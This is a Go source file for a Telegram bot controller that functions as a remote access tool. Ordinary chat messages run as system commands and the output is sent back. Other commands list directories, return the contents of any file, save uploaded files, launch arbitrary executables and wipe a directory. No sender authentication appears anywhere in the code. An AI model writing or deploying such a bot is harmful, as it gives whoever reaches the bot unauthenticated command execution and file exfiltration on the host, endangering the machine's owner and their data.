package controller

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	tg "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type Controller struct {
	bot *tg.BotAPI
}

func NewController(bot *tg.BotAPI) *Controller {
	return &Controller{bot}
}

func (c *Controller) OnCommand(msg *tg.Message) {
	switch msg.Command() {
	case "close":
		c.BotClose(msg)
		return
	case "open_photo":
		c.BotOpenPhoto(msg)
	case "get_file_body":
		c.BotGetFileBody(msg)
	case "ls":
		c.BotLs(msg)
	}
}

func (c *Controller) OnMessage(message *tg.Message) {
	commandSlice := strings.Split(message.Text, " ")
	command := exec.Command(commandSlice[0], commandSlice[1:]...)

	output, err := command.Output()
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}
	msg := tg.NewMessage(message.Chat.ID, string(output))
	c.bot.Send(msg)
}

func (c *Controller) BotLs(message *tg.Message) {
	args := message.CommandArguments()
	dirPath, err := filepath.Abs(args)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	files, err := ioutil.ReadDir(args)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	for _, file := range files {
		msg := tg.NewMessage(message.Chat.ID, dirPath+"\\"+file.Name())
		c.bot.Send(msg)
	}
}

func (c *Controller) OnPhoto(message *tg.Message) {
	file := message.Photo[0]
	link, err := c.bot.GetFileDirectURL(file.FileID)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	// Get file
	resp, err := http.Get(link)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}
	defer resp.Body.Close()

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	filesDir := os.Getenv("FILES_DIRECTORY")
	filepath := filesDir + fmt.Sprint(file.FileSize*rand.Int())

	err = os.MkdirAll(filesDir, os.ModeDir)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	// Creating new file
	img, err := os.Create(filepath)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}
	defer img.Close()

	// Write in new file
	img.Write(bytes)

	msg := tg.NewMessage(message.Chat.ID, "Your filepath: "+filepath)
	c.bot.Send(msg)
}

func (c *Controller) BotGetFileBody(message *tg.Message) {
	filepath := message.CommandArguments()
	file, err := os.Open(filepath)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}
	defer file.Close()

	fileInfo, err := ioutil.ReadAll(file)
	if err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}

	msg := tg.NewMessage(message.Chat.ID, string(fileInfo))
	c.bot.Send(msg)
}

func (c *Controller) BotOpenPhoto(message *tg.Message) {
	filepath := message.CommandArguments()
	fmt.Println(filepath)
	cmd := exec.Command(filepath)
	if err := cmd.Start(); err != nil {
		msg := tg.NewMessage(message.Chat.ID, err.Error())
		c.bot.Send(msg)
		return
	}
	msg := tg.NewMessage(message.Chat.ID, "The file has been opened!")
	c.bot.Send(msg)
}

func (c *Controller) BotClose(msg *tg.Message) {
	userDir := os.Getenv("FILES_DIRECTORY")
	os.RemoveAll(userDir)
	os.Exit(0)
}
